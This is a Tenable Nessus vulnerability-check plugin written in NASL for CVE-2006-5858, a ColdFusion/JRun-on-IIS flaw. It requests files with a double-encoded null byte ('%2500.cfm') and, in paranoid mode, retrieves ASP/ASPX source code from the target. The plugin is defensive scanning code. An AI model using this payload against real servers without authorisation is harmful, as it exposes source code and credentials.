#
# (C) Tenable Network Security
#


include("compat.inc");

if (description)
{
  script_id(24283);
  script_version("$Revision: 1.6 $");

  script_cve_id("CVE-2006-5858");
  script_bugtraq_id(21978);
  script_xref(name:"OSVDB", value:"32123");

  script_name(english:"ColdFusion / JRun on IIS Double Encoded NULL Byte Request File Content Disclosure");
  script_summary(english:"Tries to retrieve script source code using ColdFusion");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure
vulnerability." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Abobe Macromedia ColdFusion, a product for
developing and deploying web applications. 

The version of ColdFusion installed on the remote host allows an
attacker to view the contents of files not interpreted by ColdFusion
itself and hosted on the affected system.  The problem is due to the
fact that with ColdFusion, URL-encoded filenames are decoded first by
IIS and then again by ColdFusion.  By passing in a filename followed
by a double-encoded null byte and an extension handled by ColdFusion,
such as '.cfm', a remote attacker can may be able to uncover sensitive
information, such as credentials and hostnames contained in scripts,
configuration files, etc." );
 script_set_attribute(attribute:"see_also", value:"http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=466" );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/fulldisclosure/2007-01/0199.html" );
 script_set_attribute(attribute:"see_also", value:"http://www.adobe.com/support/security/bulletins/apsb07-02.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to ColdFusion MX 7.0.1 if necessary and apply the appropriate
patch as described in the vendor advisory referenced above." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );


script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl", "webmirror.nasl");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);


# Check whether it's vulnerable.
url = string("/", substr(SCRIPT_NAME, 0, strlen(SCRIPT_NAME)-6), "-", unixtime(), ".asp");
r = http_send_recv3(method:"GET", item:string(url, "%2500.cfm"), port:port);
if (isnull(r)) exit(0);
res = r[2];

# If it is...
if (
  "<title>JRun Servlet Error</title>" >< res &&
  string("404 ", url, "</h1>") >< res
)
{
  # Unless we're being paranoid, we're done.
  if (report_paranoia < 2)
  {
    security_warning(port);
    exit(0);
  }
  # Otherwise, try to exploit the flaw to make sure we can get the
  # source code for an ASP or .NET script.
  else {
    max_files = 10;
    files = get_kb_list(string("www/", port, "/content/extensions/asp"));
    if (isnull(files)) files = get_kb_list(string("www/", port, "/content/extensions/aspx"));
    if (isnull(files)) files = make_list("/index.asp", "/Default.asp", "/index.aspx", "/Default.aspx");

    n = 0;
    foreach file (files)
    {
      # Try to get the source.
      r = http_send_recv3(method: "GET", item:string(file, "%2500.cfm"), port:port);
      if (isnull(r)) exit(0);
      res = r[2];

      # If it looks like the source code...
      if (
        (file =~ "\.asp$" && "<%" >< res && "%>" >< res) ||
        (file =~ "\.aspx$" && "<%@ " >< res)
      )
      {
        # Now run the script.
        r = http_send_recv3(method: "GET", item:file, port:port);
        if (isnull(r)) exit(0);
        res2 = r[2];

        # There's a problem if the response does not look like source code this time.
        if (
          (file =~ "\.asp$" && "<%" >!< res2 && "%>" >!< res2) ||
          (file =~ "\.aspx$" && "<%@ " >!< res2)
        )
        {
          report = string(
            "Here is the source that Nessus was able to retrieve for the URL \n",
            "'", file, "' :\n",
            "\n",
            res
          );
          security_warning(port:port, extra:report); 
          exit(0);
        }
      }
      if (n++ > max_files) exit(0);
    }
  }
}
